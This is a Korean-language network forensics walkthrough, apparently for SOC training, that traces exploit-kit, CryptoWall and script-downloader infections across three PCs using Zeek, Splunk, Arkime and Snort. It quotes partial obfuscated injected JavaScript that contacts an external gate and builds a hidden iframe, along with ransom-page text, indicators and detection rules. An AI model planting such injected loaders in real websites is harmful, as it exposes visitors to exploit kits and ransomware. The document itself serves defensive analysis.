22:10:51  188.138.101.154  bizsouls.com                           /XG3vxT.php?c=a2py731nhw        113               123668
22:11:11  188.138.101.154  bizsouls.com                           /XG3vxT.php?o=py8nr3ezh06q03o   124               0
22:12:14  50.22.11.55      estudiobarco.com.ar                    /5TFv7E.php?z=py8nr3ezh06q03o   124               6
22:16:57  95.128.181.144   3wzn5p2yiumh7akj.waytopaytosystem.com  /1f96s0p                        (캡차 입력)       14463
```

Arkime에서 본문은 이렇게 보여요.

```text
POST /XG3vxT.php?y=21657wkalasvbb HTTP/1.1
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; WOW64; Trident/7.0; ...)
Host: bizsouls.com

b=31793872756d7071786e3391b3073aac2a423df8a3b5afb9cb38c907fba895a77d264b81ad...
```

**[데이터] 결과 읽기:** 한 글자 `=` 뒤에 긴 hex, 응답도 hex예요(`39187820a48aa9`, 두 번째 응답은 **hex 124 KB**). 암호화된 C2예요. 마지막 POST 두 개(bizsouls와 estudiobarco의 `o=`)는 **본문이 똑같아요.** 같은 메시지를 두 번째 중계소로 다시 보낸 거예요.

**`waytopaytosystem.com` 페이지 (Arkime):**

```text
tags == 20160107_ALERTS_ON_3_DIFFERENT_HOSTS && host.http == 3wzn5p2yiumh7akj.waytopaytosystem.com
```

**POST `/1f96s0p`**(응답 14,463바이트) 세션을 열고 natural + uncompress. 글자는 이래요(줄임).

```text
<title>Decrypt service</title>
Your files are encrypted. To get the key to decrypt files you have to pay 500 USD.
If payment is not made before 14/01/16 - 16:16 the cost of decrypting files will increase 2 times ...
Your system: Windows 7 ( x64 )   First connect IP: 103.12.9.206
We are present a special software - CryptoWall Decrypter - ...
Send BTC to Bitcoin address: ...   1.14 BTC ~= 500 USD
```

**[데이터] CryptoWall 몸값 지불 페이지**예요. Tor 게이트웨이를 거쳐서 열렸어요(페이지 코드에 `tor2web-header`). 첫 GET은 캡차("그림의 코드를 입력하세요" — `picture.php`)였고, POST로 코드를 보내자 지불 페이지가 왔어요. **사용자가 PC에서 몸값 안내문을 보고 그 안내를 따라 했어요.**

**PC A 결론:**

- **[데이터]** 해킹된 사이트 → EK 랜딩 → Flash → 암호화된 페이로드 → 새 `MSIE 7.0` 프로그램이 해킹된 사이트로 체크인 → 사용자가 CryptoWall 지불 페이지를 엶. 페이지의 "Windows 7 (x64)"가 이 PC와 맞아요.
- **[추측]** Hokaydoo-PC의 파일은 **CryptoWall**로 암호화됐어요. 이 PC가 쓸 수 있던 네트워크 공유 폴더도 피해를 입었을 수 있어요.

---

## 4단계 — PC B: 192.168.122.130 FULL-METAL-JACK { #pc-b }

### 4-1. 웹메일, 그다음 스크립트 { #pc-b-timeline }

```spl
index=zeek pcap_case=20160107_ALERTS_ON_3_DIFFERENT_HOSTS id_orig_h=192.168.122.130 (sourcetype=zeek:ssl OR sourcetype=zeek:http) ts>=1452204300
| eval name=coalesce(server_name, mvdedup(host))
| eval t=strftime(ts,"%H:%M:%S")
| stats min(t) as first max(t) as last count by sourcetype name
| sort first
```

- 로그 두 종류를 한 번에: `(sourcetype=zeek:ssl OR sourcetype=zeek:http)`. `ts>=1452204300` = 22:05:00부터.
- `coalesce(a,b)` = `a`를 쓰고, `a`가 비면 `b`를 써요. HTTPS 줄엔 `server_name`(암호화 전에 보내는 사이트 이름, **SNI**)이 있고, HTTP 줄엔 `host`가 있어요.

**보여야 하는 결과(핵심 줄):**

```text
sourcetype  name                              first     last
zeek:ssl    www.bing.com                      22:06:35  22:06:59
zeek:http   mail.yahoo.com                    22:07:00  22:07:00
zeek:ssl    login.yahoo.com                   22:07:05  22:07:33
zeek:ssl    us-mg5.mail.yahoo.com             22:07:00  22:11:47
zeek:ssl    prodxobni.mail.yahoo.com / ws-contacts / comet.yahoo.com ...
zeek:http   ma-wt.com.sa                      22:11:53  22:12:30
zeek:http   dariostoka.com                    22:11:55  22:12:34
zeek:http   freshanointingministries-sc.org   22:11:57  22:12:47
```

**[데이터] 결과 읽기:**

- 22:06–22:07: Bing, 그다음 사용자가 **Yahoo 메일에 로그인**하고(`login.yahoo.com`) 메일을 써요(`us-mg5.mail.yahoo.com`). 웹메일은 HTTPS라 **메일과 첨부 파일 내용은 못 봐요**.
- **22:11:45–47** 마지막 웹메일 연결 → **22:11:53**, 6초 뒤 `MSIE 7.0` 프로그램 시작(후보 3). 1-4의 DHCP INFORM도 22:11:53이에요.
- **[추측]** 사용자가 메일의 무언가(첨부 파일)를 열었고 **스크립트**가 실행됐어요. Referer 없는 `MSIE 7.0` User-Agent는 Windows Script Host(`.js` 파일)와 맞아요.

### 4-2. 다운로드: 프로그램인 "GIF" 파일 { #pc-b-downloads }

```spl
index=zeek sourcetype=zeek:http pcap_case=20160107_ALERTS_ON_3_DIFFERENT_HOSTS id_orig_h=192.168.122.130 uri="/counter/*"
| eval host=mvdedup(host)
| rex field=uri "rnd=(?<rnd>\d+)"
| eval t=strftime(ts,"%H:%M:%S")
| table t id_resp_h host rnd status_code resp_filenames resp_mime_types response_body_len
```

- `uri="/counter/*"` — 이 요청만.
- `rex field=uri "rnd=(?<rnd>\d+)"` — `rnd=` 뒤의 숫자를 잘라서 새 필드 `rnd`를 만들어요(`\d+` = 숫자 하나 이상).
- `resp_filenames` = 서버가 붙인 파일 이름(`Content-Disposition: attachment; filename=…`). `resp_mime_types` = Zeek가 **안을 보고** 찾은 형식.

**보여야 하는 결과:**

```text
t         id_resp_h       host                              rnd      status  resp_filenames        resp_mime_types         response_body_len
22:11:53  216.158.85.7    ma-wt.com.sa                      8742951  200                                                   0
22:11:55  174.36.186.235  dariostoka.com                    8742951  200     775d4.gif                                     0
22:11:57  184.168.173.1   freshanointingministries-sc.org   8742951  200                                                   0
22:11:58  216.158.85.7    ma-wt.com.sa                      8742952  200     66b32.gif             application/x-dosexec   260613
22:12:04  174.36.186.235  dariostoka.com                    8742952  200     174125.gif            application/x-dosexec   260613
22:12:21  184.168.173.1   freshanointingministries-sc.org   8742952  200     c9a63078fe7d3741.gif  application/x-dosexec   260619
22:12:30  216.158.85.7    ma-wt.com.sa                      8742953  200     250acae.gif           application/x-dosexec   114688
22:12:34  174.36.186.235  dariostoka.com                    8742953  200     d50f729942631.gif     application/x-dosexec   114688
22:12:47  184.168.173.1   freshanointingministries-sc.org   8742953  200     2487ff63fb4e79.gif    application/x-dosexec   145922
```

**[데이터] 결과 읽기:**

- **모든 요청에 똑같은 긴 `id=`** — 피해자 ID 하나 — 그리고 `rnd`가 **…51, …52, …53**으로 늘어요. 회차 셋, 회차마다 **세 사이트에 모두** 물어요. 목록을 차례로 도는 스크립트예요.
- 1회차는 아무것도 못 받았어요. 2, 3회차에 **파일 여섯 개**를 받았어요.
- 서버는 **`image/gif`**라고 하고 이름도 `.gif`예요. Zeek가 안을 보니 **`application/x-dosexec` = 윈도우 프로그램**(`MZ`로 시작)이에요. 이름표만 보는 필터를 지나가려는 위장이에요.
- Referer 없음, `MSIE 7.0` — 브라우저가 아니에요.

### 4-3. 해시 (Splunk) { #pc-b-hashes }

```spl
index=zeek sourcetype=zeek:files pcap_case=20160107_ALERTS_ON_3_DIFFERENT_HOSTS rx_hosts="192.168.122.130" mime_type="application/x-dosexec"
| eval t=strftime(ts,"%H:%M:%S")
| stats min(t) as first count values(tx_hosts) as from by md5 seen_bytes
```

- `stats … by md5 seen_bytes`로 같은 파일끼리 묶어요. 몇 번, 어디서 받았는지 나와요.

```text
md5                                 seen_bytes  first     count  from
9f756e72eacc6b805481a49ce51c4a79    260613      22:11:58  2      216.158.85.7 174.36.186.235
d411bf37de7f72e98a62fc82917f50f7    260619      22:12:21  1      184.168.173.1
e851eb249d2c38d56d1b496a3112cebc    114688      22:12:30  2      216.158.85.7 174.36.186.235
92a4d0aeede3ce110b4121342df48496    145922      22:12:47  1      184.168.173.1
```

**[데이터]** 다운로드 6번, **서로 다른 EXE 4개**예요. `zeek:pe`가 있으면 `index=zeek sourcetype=zeek:pe pcap_case=… | table ts id os compile_ts is_exe`로 윈도우 실행 파일인 걸 볼 수 있어요. 이 MD5는 **진짜 프로그램**(암호화 안 됨)의 해시라서 호스트 담당자가 디스크에서 찾을 수 있어요.

SHA256(호스트 담당자와 악성코드 데이터베이스용):

```text
95a9c8fccbe0e49dc132cf59d7ebf73e692da9f35491e0bfcac40b92c9022f5c  (260,613 B)
220a2e4f93d85f16dd74ed56247644e126b8d2d262374c4f09ec2be49cbcd0f3  (260,619 B)
306ab541cf4ace30c0f905ded4c26b40458c4dda28d9c5f00abd679ada6cf27d  (114,688 B)
227193160a2448dfa8bbbd2cf125afa9cca0d1a718b109a3adae5df8a24cdf6e  (145,922 B)
```

### 4-4. 다운로드 뒤에 무슨 일이 있었나 { #pc-b-after }

```spl
index=zeek sourcetype=zeek:conn pcap_case=20160107_ALERTS_ON_3_DIFFERENT_HOSTS id_orig_h=192.168.122.130 ts>=1452204775
| eval t=strftime(ts,"%H:%M:%S")
| stats min(t) as first count by id_resp_h id_resp_p service
| sort first
```

- `ts>=1452204775` = 마지막 다운로드가 끝난 **22:12:55**부터.

**보여야 하는 결과:** Yahoo 메일 연결(124.108.101.10, 106.10.x)과 DNS뿐이에요. **[데이터] 다운로드 뒤 새 목적지가 없어요.**

**PC B 결론:**

- **[데이터]** 웹메일을 쓴 지 6초 뒤, 스크립트가 해킹된 웹사이트 3곳에서 GIF로 위장한 윈도우 프로그램 4개(다운로드 6번)를 받았어요.
- **[추측]** 시작은 **스크립트 첨부 파일이 달린 악성 메일**이에요(원래 실습에서 zip으로 묶은 `.js` 첨부로 확인됨). 받은 프로그램은 악성코드예요. 실행됐는지는 안 보여요 — 남은 4분 동안 후속 통신이 없어요. **감염된 PC로 처리해요.**

---

## 5단계 — PC C: 192.168.122.52 Jennifer-PC { #pc-c }

### 5-1. 검색에서 게이트까지 { #pc-c-chain }

```spl
index=zeek sourcetype=zeek:http pcap_case=20160107_ALERTS_ON_3_DIFFERENT_HOSTS id_orig_h=192.168.122.52 ts>=1452204540 ts<=1452204570
| eval host=mvdedup(host)
| eval t=strftime(ts,"%H:%M:%S.%3N")
| sort ts
| table t host uri referrer status_code resp_mime_types response_body_len
```

- 22:09:00 – 22:09:30, 30초 구간이에요. 이상한 요청 바로 앞뒤에 무슨 일이 있었는지 봐요.
- \* 스크립트는 Zeek가 `text/plain`이나 `application/javascript`로 적을 수 있어요. 둘 다 "글자, 스크립트"라는 뜻이에요.

**보여야 하는 결과(핵심 줄):**

```text
t              host                 uri                                    referrer                                     status  mime*        len
22:09:05.759   ri.search.yahoo.com  /_ylt=…/RU=http%3a%2f%2fplanetside.co.uk%2f/…   http://au.search.yahoo.com/search?p=planetside.co.uk…
22:09:12.190   planetside.co.uk     /                                      http://au.search.yahoo.com/search?p=…         200     text/html    23509
22:09:20.017   planetside.co.uk     /media/system/js/mootools-core.js      http://planetside.co.uk/                     200     text/plain   99877
22:09:23.764   planetside.co.uk     /media/system/js/core.js               http://planetside.co.uk/                     200     text/plain   4784
22:09:24.829   st.domandvilma.com   /fvviewforumqn.php                     http://planetside.co.uk/                     200     text/plain   26
22:09:26.423   planetside.co.uk     /media/system/js/caption.js            http://planetside.co.uk/                     200
```

**[데이터] 결과 읽기:**

- 사용자가 Yahoo에서 `planetside.co.uk`를 검색하고 결과를 눌렀어요. 3D 풍경 소프트웨어 회사 사이트(Joomla)예요.
- **22:09:24 — `st.domandvilma.com/fvviewforumqn.php`**, Referer = planetside 페이지. 페이지의 무언가가 planetside와 관계없는 서버를 불렀어요.
- **응답은 26바이트뿐이에요.** EK 랜딩 페이지는 KB 단위예요. 이 뒤로 .52는 이상한 곳에 가지 않아요.

### 5-2. 어느 파일이 게이트를 불렀나 (Arkime) { #pc-c-inject }

Referer는 **어느 페이지**인지만 알려 주고 **그 안의 어느 스크립트**인지는 안 알려 줘요. 시간을 써요. 게이트 요청은 `mootools-core.js`(22:09:20)와 `core.js`(22:09:23) 바로 뒤예요. 큰 쪽을 열어요.

```text
tags == 20160107_ALERTS_ON_3_DIFFERENT_HOSTS && ip.src == 192.168.122.52 && http.uri == /media/system/js/mootools-core.js
```

응답에서 **`viewforum`**을 찾아요(Ctrl+F). `domandvilma`라는 이름 자체는 평문으로 **없어요**. 이스케이프 코드로 썼어요(`\x6d` = `m`, `n` = `n`). 정상 MooTools 코드 끝 근처에 여기 있으면 안 되는 코드가 있어요.

```text
/* S4PoQHwRAGy */var jcvJp4p="\x75ser\x69dA0817FB25";var oD4RG9="30";
...
tdxwSOD.src="\x68ttp:\x2f/st.do\x6dandvilm\x61.com\x2f"+j7aMn(2,6)+"vi\x65wforum"+j7aMn(2,6)+".php"
...
function rkVOLS(){ ... if(main_color_handle.length==0){xco56v_(jcvJp4p,oD4RG9,48);return;} ...
  var FCPKqK="<iframe ... src='"+mClKFF+"' width=19 height=19 frameborder=0 scrolling='no'></iframe>"; ...
```

| 부분 | 뜻 |
|---|---|
| `"\x68ttp:\x2f/st.do\x6dandvilm\x61.com\x2f"` | `http://st.domandvilma.com/`를 이스케이프 코드로 — 글자 검색에 안 걸리게 |
| `j7aMn(2,6)+"viewforum"+j7aMn(2,6)+".php"` | 무작위 글자 + `viewforum` + 무작위 글자 + `.php` → `fvviewforumqn.php` |
| `if(main_color_handle.length==0){ … return; }` | **게이트가 빈 값을 주면 쿠키만 남기고 멈춤** |
| `<iframe … width=19 height=19 …>` | 아니면 게이트가 준 주소로 아주 작은 숨은 iframe을 만듦 — 그게 익스플로잇 킷 |

이제 게이트의 응답을 열어요.

```text
tags == 20160107_ALERTS_ON_3_DIFFERENT_HOSTS && host.http == st.domandvilma.com
```

```text
HTTP/1.1 200 OK
Content-Type: text/javascript; charset=ISO-8859-1
Set-Cookie: fltna=...; domain=st.domandvilma.com

var main_color_handle='';
```

**[데이터] 게이트가 빈 값을 줬어요.** 스크립트 자체 논리대로 멈췄어요. iframe도, 익스플로잇 킷도 없어요. 통신과도 맞아요 — 22:09:24 뒤로 악성 활동이 없어요.

**[추측] 왜 비었을까요?** 이런 게이트는 원하는 방문자(맞는 브라우저, 국가, 처음 온 사람)에게만 EK 주소를 줘요. 이번 방문은 걸러졌어요. 운이 좋았지만 **사이트는 여전히 해킹된 상태**예요. 다음 방문자는 다를 수 있어요.

### 5-3. .52의 나머지 통신 { #pc-c-rest }

22:15:29부터 사용자가 `www.outdoorsamoa.com`과 트립어드바이저를 봐요. 그 구간도 5-1처럼 확인해요. 사이트, 구글 글꼴, 트립어드바이저 파일뿐이고, 모르는 도메인, `MSIE 7.0`, `zeek:files`의 EXE가 없어요.

```spl
index=zeek sourcetype=zeek:files pcap_case=20160107_ALERTS_ON_3_DIFFERENT_HOSTS rx_hosts="192.168.122.52"
| stats count by mime_type
```

**보여야 하는 결과:** 이미지, `text/html`, `text/plain`(스크립트), 글꼴 — **`application/x-dosexec`도 Flash도 없어요.**

**PC C 결론:** **[데이터]** 해킹된 사이트에 심긴 스크립트가 게이트에 연락했고, 게이트가 아무것도 안 줘서 익스플로잇이나 다운로드가 없었어요. **감염 안 됨.** 해킹된 사이트는 보고해요.

---

## 6단계 — 간단한 Snort 룰과 시험 { #snort }

악성 활동마다 아주 간단한 룰 하나씩이에요. pcapbox의 Snort는 TCP 내용을 다 보니까 `Host:` 헤더의 이름을 `content`로 맞추면 충분해요.

```text
alert tcp $HOME_NET any -> $EXTERNAL_NET 80 (msg:"EK securetopc.top - Sung"; content:"securetopc.top"; nocase; sid:1000051; rev:1;)
alert tcp $HOME_NET any -> $EXTERNAL_NET 80 (msg:"JS downloader counter id - Sung"; content:"/counter/?id="; nocase; sid:1000052; rev:1;)
alert tcp $HOME_NET any -> $EXTERNAL_NET 80 (msg:"CryptoWall decrypt page waytopaytosystem.com - Sung"; content:"waytopaytosystem.com"; nocase; sid:1000053; rev:1;)
```

- `$HOME_NET any -> $EXTERNAL_NET 80` — 내부에서 외부 80번 포트로. `content` + `nocase` — 패킷 어디든 이 글자, 대소문자 무시. `sid` 1000000 이상 = 직접 만든 룰.

룰을 하나씩 **한 줄로** `\\10.50.10.60\rules\local.rules`에 넣고 pcapbox에서:

```bash
sudo snort -T -c /etc/snort/snort.conf 2>&1 | tail -5
snort-test 20160107_ALERTS_ON_3_DIFFERENT_HOSTS
```

**보여야 하는 결과(대략):** sid 1000051은 `securetopc.top` 요청 5개, sid 1000052는 `/counter/?id=` 요청 9개, sid 1000053은 지불 사이트 요청(17개)에 걸려요. 숫자가 조금 많으면 Snort가 요청 하나의 두 번째 패킷에서도 같은 글자를 찾은 거예요. `index=snort pcap_case=20160107_ALERTS_ON_3_DIFFERENT_HOSTS | stats count by sid dest_ip`로 확인해요.

---

## 타임라인 (2016-01-07, UTC) { #timeline }

| 시각 | PC | 이벤트 |
|---|---|---|
| 22:05:47 | 전체 | 캡처 시작, .130, .52(22:06:02), .132(22:06:21) DHCP |
| 22:07:00–22:11:47 | B .130 | Yahoo 메일(HTTPS) |
| 22:08:49 | C .52 | Yahoo에서 planetside.co.uk 검색 |
| 22:09:12 | C .52 | `planetside.co[.]uk`(해킹됨, `mootools-core.js`에 심긴 스크립트) |
| 22:09:24 | C .52 | 게이트 `st.domandvilma[.]com` → `var main_color_handle='';` → **아무 일 없음** |
| 22:10:08–10 | A .132 | 구글 결과 → `www.koeppl[.]com`(해킹됨, `<html>` 앞의 코드) |
| 22:10:15 | A .132 | EK 랜딩 `uacltr.securetopc[.]top`(89.38.144.75) |
| 22:10:17 | A .132 | Flash 익스플로잇(83 KB) |
| 22:10:26 | A .132 | `gbesbsdsb.securetopc[.]top`에서 암호화된 페이로드(412 KB) |
| 22:10:47–22:12:14 | A .132 | `MSIE 7.0` POST 체크인 `bizsouls[.]com`, `estudiobarco.com[.]ar` |
| 22:11:53 | B .130 | 스크립트가 해킹된 사이트 3곳에 `/counter/?id=` 요청 시작 |
| 22:11:58–22:12:47 | B .130 | `.gif` 이름의 EXE 다운로드 6번(서로 다른 4개) |
| 22:15:29 | C .52 | 정상 브라우징(outdoorsamoa, 트립어드바이저) |
| 22:16:46–22:17:05 | A .132 | 사용자가 `3wzn5p2yiumh7akj.waytopaytosystem[.]com`의 **CryptoWall "Decrypt service"** 페이지를 엶 |
| 22:17:18 | 전체 | 캡처 끝 |

---

## 지표 { #iocs }

| 지표 | 종류 | PC | 역할 |
|---|---|---|---|
| `www.koeppl[.]com` 92.51.131.150 | 도메인 / IP | A | 해킹된 사이트(`<html>` 앞의 코드) |
| `uacltr.securetopc[.]top`, `gbesbsdsb.securetopc[.]top` 89.38.144.75 | 도메인 / IP | A | 익스플로잇 킷(랜딩, Flash, 페이로드) |
| `bizsouls[.]com` 188.138.101.154, `estudiobarco.com[.]ar` 50.22.11.55 | 도메인 / IP | A | CryptoWall 체크인(해킹된 사이트) |
| `3wzn5p2yiumh7akj.waytopaytosystem[.]com` 95.128.181.144 | 도메인 / IP | A | CryptoWall 지불 페이지(Tor 게이트웨이) |
| 6631e8c0d5f07004fabff81872f10d5e | MD5 | A | Flash 익스플로잇 |
| `ma-wt.com[.]sa` 216.158.85.7, `dariostoka[.]com` 174.36.186.235, `freshanointingministries-sc[.]org` 184.168.173.1 | 도메인 / IP | B | EXE 다운로드(`/counter/?id=`) |
| 9f756e72…4a79, d411bf37…7f50f7, e851eb24…cebc, 92a4d0ae…8496 | MD5 | B | 내려받은 EXE(4개) |
| `planetside.co[.]uk` 67.225.139.108 | 도메인 / IP | C | 해킹된 사이트(심긴 스크립트) |
| `st.domandvilma[.]com` 192.185.21.183 | 도메인 / IP | C | 게이트(아무것도 안 줌) |

---

## 복사해서 쓰는 쿼리 { #query-sheet }

`<case>`는 케이스 이름으로 바꿔요.

```spl
index=zeek pcap_case=<case> | stats count by sourcetype | sort - count
index=zeek sourcetype=zeek:conn pcap_case=<case> | stats min(ts) as first max(ts) as last count as sessions | eval duration_min=round((last-first)/60,1) | eval first=strftime(first,"%Y-%m-%d %H:%M:%S"), last=strftime(last,"%Y-%m-%d %H:%M:%S")
index=zeek sourcetype=zeek:conn pcap_case=<case> id_orig_h=192.168.0.0/16 | stats count as sessions dc(id_resp_h) as destinations sum(orig_bytes) as sent sum(resp_bytes) as received min(ts) as first by id_orig_h | eval first=strftime(first,"%H:%M:%S") | sort first
index=zeek sourcetype=zeek:dhcp pcap_case=<case> | eval t=strftime(ts,"%H:%M:%S") | table t client_addr assigned_addr mac host_name msg_types server_addr | sort t
index=zeek sourcetype=zeek:http pcap_case=<case> | eval host=mvdedup(host) | eval t=strftime(ts,"%H:%M:%S") | stats min(t) as first count dc(host) as sites by id_orig_h user_agent | sort id_orig_h first
index=zeek sourcetype=zeek:dns pcap_case=<case> id_resp_p=53 | stats count by id_orig_h id_resp_h
index=zeek sourcetype=zeek:http pcap_case=<case> | eval host=mvdedup(host) | eval t=strftime(ts,"%H:%M:%S") | stats min(t) as first count values(method) as methods sum(response_body_len) as received by id_orig_h host | sort id_orig_h first
index=zeek sourcetype=zeek:conn pcap_case=<case> proto=tcp NOT id_resp_h=192.168.0.0/16 NOT [search index=zeek sourcetype=zeek:dns pcap_case=<case> | mvexpand answers | rename answers as id_resp_h | dedup id_resp_h | fields id_resp_h] | stats count by id_orig_h id_resp_h id_resp_p
index=zeek sourcetype=zeek:http pcap_case=<case> id_orig_h=<pc> ts>=<epoch> | eval host=mvdedup(host) | eval t=strftime(ts,"%H:%M:%S.%3N") | sort ts | table t host uri referrer status_code resp_mime_types response_body_len
index=zeek sourcetype=zeek:files pcap_case=<case> tx_hosts="<server ip>" | eval t=strftime(ts,"%H:%M:%S") | table t tx_hosts rx_hosts mime_type seen_bytes md5
index=zeek sourcetype=zeek:http pcap_case=<case> id_orig_h=<pc> method=POST | eval host=mvdedup(host) | eval t=strftime(ts,"%H:%M:%S") | table t id_resp_h host uri user_agent request_body_len response_body_len
index=zeek pcap_case=<case> id_orig_h=<pc> (sourcetype=zeek:ssl OR sourcetype=zeek:http) | eval name=coalesce(server_name, mvdedup(host)) | eval t=strftime(ts,"%H:%M:%S") | stats min(t) as first max(t) as last count by sourcetype name | sort first
index=zeek sourcetype=zeek:http pcap_case=<case> id_orig_h=<pc> uri="/counter/*" | eval host=mvdedup(host) | rex field=uri "rnd=(?<rnd>\d+)" | eval t=strftime(ts,"%H:%M:%S") | table t id_resp_h host rnd status_code resp_filenames resp_mime_types response_body_len
index=zeek sourcetype=zeek:files pcap_case=<case> rx_hosts="<pc>" mime_type="application/x-dosexec" | eval t=strftime(ts,"%H:%M:%S") | stats min(t) as first count values(tx_hosts) as from by md5 seen_bytes
index=zeek sourcetype=zeek:files pcap_case=<case> rx_hosts="<pc>" | stats count by mime_type
```

**Arkime**

```text
tags == <case> && ip.src == 192.168.122.132 && host.http == www.koeppl.com && http.uri == "/"
tags == <case> && host.http == 3wzn5p2yiumh7akj.waytopaytosystem.com
tags == <case> && ip.src == 192.168.122.52 && http.uri == /media/system/js/mootools-core.js
tags == <case> && host.http == st.domandvilma.com
tags == <case> && ip.src == 192.168.122.130 && http.uri == /counter/*
```

---

## 배운 점 { #lessons }

1. **경보 셋, 답도 셋.** 경보는 "여기를 보세요"이지 "감염됨"이 아니에요. 경보 **뒤에** 무슨 일이 있었는지로 PC마다 판단해요.
2. **감염 = 새로운 무언가가 실행됨.** PC A와 B는 브라우저가 아닌 **새 User-Agent**(`MSIE 7.0`)가 나와요. PC C는 끝까지 안 나와요.
3. **크기가 많은 걸 말해요.** 26바이트 응답은 익스플로잇 킷일 수 없고, Flash 파일 뒤에 온 형식 없는 412 KB는 거의 확실히 페이로드예요.
4. **이름표는 거짓말해도 내용은 안 해요.** `image/gif`에 `.gif` 이름이지만 Zeek의 `application/x-dosexec`는 "프로그램"이라고 해요. `resp_filenames`와 `resp_mime_types`를 항상 비교해요.
5. **심긴 코드는 주소만이 아니라 논리를 읽어요.** `if (main_color_handle.length==0) return;`이 PC C에서 아무 일이 없던 이유를 설명해요.
6. **모든 방법이 무언가를 찾지는 않아요.** DNS 없는 목적지 서브서치는 여기서 아무것도 못 찾았어요. C2가 모두 이름을 썼거든요. 그것도 결과예요.
7. **HTTPS가 PC B 이야기의 시작을 숨겨요.** 웹메일 시간(22:11:47 → 22:11:53)이 연결 고리예요. 첨부 파일 자체는 메일함이나 호스트에서 가져와야 해요.
8. **사용자의 행동도 중요해요.** PC A의 사용자는 몸값 지불 페이지를 열었어요. 누가 돈을 내기 전에 대응팀에 알려요.

## 참고 자료 { #references }

- [Sorting through the alerts — 같은 Splunk 중심 방법](socgholish-fake-chrome-update-wscript-c2.md) · [피싱 미끼에서 EK 드라이브바이까지](phishing-red-herring-ek-driveby-ursnif-c2.md)
- [SPL 치트시트](../splunk/spl-cheatsheet.md) · [Arkime 검색 문법](../../network/arkime/search-syntax.md)
- [Zeek 로그](../../network/zeek/index.md) · [files.log](../../network/zeek/files-log.md) · [conn.log](../../network/zeek/conn-log.md)
- 원래 실습: [malware-traffic-analysis.net — 2016-01-07 Alerts on 3 different hosts](https://malware-traffic-analysis.net/2016/01/07/index.html) · [답](https://www.malware-traffic-analysis.net/2016/01/07/page2.html)
